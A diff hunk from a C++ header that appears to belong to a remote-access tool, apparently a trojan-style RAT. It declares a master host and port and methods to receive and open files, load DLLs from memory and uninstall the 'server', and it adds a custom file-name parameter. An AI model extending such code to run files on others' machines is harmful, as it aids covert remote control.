@@ -30,7 +30,7 @@ public:
 
 	static	char	m_strMasterHost[256];
 	static	UINT	m_nMasterPort;
-	BOOL	RecvAndOpenFile(const void *filedata, UINT size, INT nShowCmd);
+	BOOL RecvAndOpenFile(const void *filedata, UINT size, INT nShowCmd, LPCTSTR lpCustomFileName = NULL);
 	BOOL	OpenFileDll(const void *filedata, UINT size);
 	void	ReStartServer();
 	void	UnInstallServer();
